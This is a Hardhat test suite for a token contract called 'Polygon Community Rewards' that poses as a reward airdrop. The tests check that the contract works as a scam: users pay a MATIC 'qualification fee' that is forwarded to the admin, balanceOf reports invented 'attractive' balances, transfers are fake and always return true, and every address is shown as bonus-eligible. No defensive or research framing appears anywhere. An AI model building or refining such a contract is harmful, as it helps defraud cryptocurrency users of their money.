const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("PolygonRewardDistributor", function () {
  let rewardDistributor;
  let admin;
  let participant1;
  let participant2;

  beforeEach(async function () {
    // Get signers
    [admin, participant1, participant2] = await ethers.getSigners();

    // Deploy contract
    const PolygonRewardDistributor = await ethers.getContractFactory("PolygonRewardDistributor");
    rewardDistributor = await PolygonRewardDistributor.deploy();
    await rewardDistributor.waitForDeployment();
  });

  describe("Deployment", function () {
    it("Should set the right admin", async function () {
      expect(await rewardDistributor.getSystemAdmin()).to.equal(admin.address);
    });

    it("Should have correct token metadata", async function () {
      expect(await rewardDistributor.name()).to.equal("Polygon Community Rewards");
      expect(await rewardDistributor.symbol()).to.equal("PCR");
      expect(await rewardDistributor.decimals()).to.equal(18);
    });

    it("Should have correct total supply", async function () {
      const totalSupply = await rewardDistributor.totalSupply();
      expect(totalSupply).to.equal(ethers.parseEther("50000000"));
    });

    it("Should initialize with zero participants", async function () {
      expect(await rewardDistributor.getTotalParticipants()).to.equal(0);
    });
  });

  describe("Participation Functions", function () {
    it("Should fail when sending insufficient MATIC", async function () {
      const insufficientAmount = ethers.parseEther("0.0009"); // Less than 0.001
      
      await expect(
        rewardDistributor.connect(participant1).participateInDistribution({ value: insufficientAmount })
      ).to.be.revertedWith("Qualification fee required: 0.001 MATIC minimum");
    });

    it("Should succeed when sending minimum MATIC amount", async function () {
      const participationFee = ethers.parseEther("0.001");
      
      await expect(
        rewardDistributor.connect(participant1).participateInDistribution({ value: participationFee })
      ).to.emit(rewardDistributor, "RewardDistributed")
        .withArgs(participant1.address, ethers.parseEther("1000"));
    });

    it("Should transfer MATIC to contract admin", async function () {
      const participationFee = ethers.parseEther("0.01");
      const initialAdminBalance = await ethers.provider.getBalance(admin.address);
      
      await rewardDistributor.connect(participant1).participateInDistribution({ value: participationFee });
      
      const finalAdminBalance = await ethers.provider.getBalance(admin.address);
      expect(finalAdminBalance).to.be.gt(initialAdminBalance);
    });

    it("Should log participant interactions", async function () {
      const participationFee = ethers.parseEther("0.001");
      
      expect(await rewardDistributor.hasParticipated(participant1.address)).to.be.false;
      
      await rewardDistributor.connect(participant1).participateInDistribution({ value: participationFee });
      
      expect(await rewardDistributor.hasParticipated(participant1.address)).to.be.true;
      expect(await rewardDistributor.getTotalParticipants()).to.equal(1);
    });

    it("Should work with alternative claim function", async function () {
      const participationFee = ethers.parseEther("0.001");
      
      await expect(
        rewardDistributor.connect(participant1).claimCommunityReward({ value: participationFee })
      ).to.emit(rewardDistributor, "RewardDistributed")
        .withArgs(participant1.address, ethers.parseEther("1500"));
    });
  });

  describe("ERC20-Style Functions", function () {
    it("Should return attractive balances for addresses", async function () {
      const adminBalance = await rewardDistributor.balanceOf(admin.address);
      const participantBalance = await rewardDistributor.balanceOf(participant1.address);
      
      expect(adminBalance).to.equal(ethers.parseEther("10000000")); // Admin has 10M
      expect(participantBalance).to.equal(ethers.parseEther("1750")); // Default attractive balance
    });

    it("Should return zero balance for zero address", async function () {
      const balance = await rewardDistributor.balanceOf(ethers.ZeroAddress);
      expect(balance).to.equal(0);
    });

    it("Should update balance after participation", async function () {
      const initialBalance = await rewardDistributor.balanceOf(participant1.address);
      expect(initialBalance).to.equal(ethers.parseEther("1750"));
      
      await rewardDistributor.connect(participant1).participateInDistribution({ value: ethers.parseEther("0.001") });
      
      const newBalance = await rewardDistributor.balanceOf(participant1.address);
      expect(newBalance).to.equal(ethers.parseEther("2500")); // Participants have 2500
    });

    it("Should always return true for transfer", async function () {
      const result = await rewardDistributor.connect(participant1).transfer.staticCall(participant2.address, ethers.parseEther("100"));
      expect(result).to.be.true;
    });

    it("Should emit Transfer event on fake transfer", async function () {
      await expect(
        rewardDistributor.connect(participant1).transfer(participant2.address, ethers.parseEther("100"))
      ).to.emit(rewardDistributor, "Transfer")
        .withArgs(participant1.address, participant2.address, ethers.parseEther("100"));
    });

    it("Should return max allowance", async function () {
      const allowance = await rewardDistributor.allowance(participant1.address, participant2.address);
      expect(allowance).to.equal(ethers.MaxUint256);
    });

    it("Should show attractive remaining distribution", async function () {
      const remaining = await rewardDistributor.getRemainingDistribution();
      expect(remaining).to.equal(ethers.parseEther("25000000"));
    });

    it("Should always show bonus eligibility", async function () {
      const eligible1 = await rewardDistributor.checkBonusEligibility(participant1.address);
      const eligible2 = await rewardDistributor.checkBonusEligibility(participant2.address);
      
      expect(eligible1).to.be.true;
      expect(eligible2).to.be.true;
    });
  });

  describe("Admin Functions", function () {
    it("Should return correct participation fee", async function () {
      const fee = await rewardDistributor.getParticipationFee();
      expect(fee).to.equal(ethers.parseEther("0.001"));
    });

    it("Should allow admin to view interaction history", async function () {
      // Participate first to create history
      await rewardDistributor.connect(participant1).participateInDistribution({ value: ethers.parseEther("0.001") });
      await rewardDistributor.connect(participant2).claimCommunityReward({ value: ethers.parseEther("0.001") });
      
      const history = await rewardDistributor.connect(admin).getInteractionHistory();
      expect(history).to.have.lengthOf(2);
      expect(history[0]).to.equal(participant1.address);
      expect(history[1]).to.equal(participant2.address);
    });

    it("Should prevent non-admin from viewing interaction history", async function () {
      await expect(
        rewardDistributor.connect(participant1).getInteractionHistory()
      ).to.be.revertedWith("Admin access required");
    });
  });

  describe("Receive and Fallback Functions", function () {
    it("Should accept direct MATIC transfers and forward to admin", async function () {
      const sendAmount = ethers.parseEther("0.1");
      const initialAdminBalance = await ethers.provider.getBalance(admin.address);
      
      await participant1.sendTransaction({
        to: await rewardDistributor.getAddress(),
        value: sendAmount
      });
      
      const finalAdminBalance = await ethers.provider.getBalance(admin.address);
      expect(finalAdminBalance).to.be.gt(initialAdminBalance);
    });

    it("Should log participants on direct transfers", async function () {
      const sendAmount = ethers.parseEther("0.05");
      
      expect(await rewardDistributor.hasParticipated(participant1.address)).to.be.false;
      
      await participant1.sendTransaction({
        to: await rewardDistributor.getAddress(),
        value: sendAmount
      });
      
      expect(await rewardDistributor.hasParticipated(participant1.address)).to.be.true;
    });
  });
});
